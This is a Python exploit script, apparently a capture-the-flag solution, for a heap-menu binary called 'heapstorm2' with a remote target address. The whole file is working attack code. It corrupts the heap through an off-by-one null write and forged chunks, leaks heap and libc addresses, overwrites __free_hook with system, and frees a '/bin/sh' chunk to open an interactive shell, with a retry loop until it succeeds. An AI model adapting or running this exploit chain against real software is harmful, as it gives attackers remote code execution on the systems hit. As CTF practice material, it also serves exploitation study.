#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './heapstorm2'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'202.120.7.204', 'port':127})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.24.so')
env.select()

#==========

binf = ELF(bin_file)
addr_control        = 0x13370800

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    hs = HeapStorm(conn)

    hs.allocate(0x890)      # 0
    for _ in range(4):
        hs.allocate(0x1000) # 1-4

    hs.allocate(0x18)       # 5 : keep
    hs.allocate(0xf0)       # 6
    hs.allocate(0x18)       # 7 : keep

    for i in range(7):
        hs.update(5, 'a'*(0x18-12-i))
    hs.update(5, 'a'*(0x18-12-8))

    hs.delete(0)
    hs.delete(6)

    hs.allocate(0x8a0)  # 0
    hs.allocate(0x410)  # 6
    hs.allocate(0xbe0)  # 8
    hs.allocate(0x400)  # 9
    hs.allocate(0x10)   # 10

    hs.delete(9)
    hs.delete(6)
    hs.allocate(0x410)  # 6
    hs.delete(6)

    fake_chunk  = p64(0)
    fake_chunk += p64(0x421)
    fake_chunk += p64(0xdeadbeef)
    fake_chunk += p64(addr_control - 0x20)
    hs.update(1, fake_chunk)

    fake_chunk  = p64(0)
    fake_chunk += p64(0x411)
    fake_chunk += p64(0xdeadbeef)
    fake_chunk += p64(addr_control - 0x20 + 0x8)
    fake_chunk += p64(0xdeadbeef)
    fake_chunk += p64(addr_control - 0x20+3 - 0x20)
    hs.update(2, fake_chunk)

    hs.allocate(0x48)   # 6 at addr_control - 0x20

    fake_control  = p64(0)*3
    fake_control += p64(0x13377331)
    fake_control += p64(addr_control)
    fake_control += p64(0x100)
    hs.update(6, p64(0)*2 + fake_control[:0x28])
    hs.update(0, fake_control)

    leak = hs.view(0)
    key_ptr         = u64(leak[0xb0:0xb8])
    info('key_ptr           = 0x{:08x}'.format(key_ptr))
    addr_heap_base  = (u64(leak[0x40:0x48])^key_ptr) - 0x18c0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    fake_control  = p64(0)*3
    fake_control += p64(0x13377331)
    fake_control += p64(addr_control)
    fake_control += p64(0x100)
    fake_control += p64(addr_heap_base + 0x8b0)
    fake_control += p64(0x18)
    hs.update(0, fake_control)

    addr_libc_mainarena = u64(hs.view(1)[0x10:0x18]) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))
    addr_libc_free_hook = libc.symbols['__free_hook']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    fake_control  = p64(0)*3
    fake_control += p64(0x13377331)
    fake_control += p64(addr_control)
    fake_control += p64(0x100)
    fake_control += p64(addr_libc_free_hook)
    fake_control += p64(0x8 + 0xc)
    fake_control += p64(addr_libc_str_sh)
    fake_control += p64(0x1)
    hs.update(0, fake_control)
    hs.update(1, p64(addr_libc_system))
    hs.delete(2)

class HeapStorm:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def allocate(self, size):
        self.recvuntil('Command: ')
        self.sendline('1')
        self.recvuntil('Size: ')
        self.sendline(str(size))

    def update(self, idx, content):
        self.recvuntil('Command: ')
        self.sendline('2')
        self.recvuntil('Index: ')
        self.sendline(str(idx))
        self.recvuntil('Size: ')
        self.sendline(str(len(content)))
        self.recvuntil('Content: ')
        self.send(content)

    def delete(self, idx):
        self.recvuntil('Command: ')
        self.sendline('3')
        self.recvuntil('Index: ')
        self.sendline(str(idx))

    def view(self, idx):
        self.recvuntil('Command: ')
        self.sendline('4')
        self.recvuntil('Index: ')
        self.sendline(str(idx))
        self.recvuntil(': ')
        return self.recvuntil('\n1. Allocate', drop=True)

#==========

if __name__=='__main__':
    while True: 
        conn = communicate(env.mode, **env.target)
        try:
            attack(conn)
            break
        except:
            conn.close()
    conn.interactive()
    
#==========
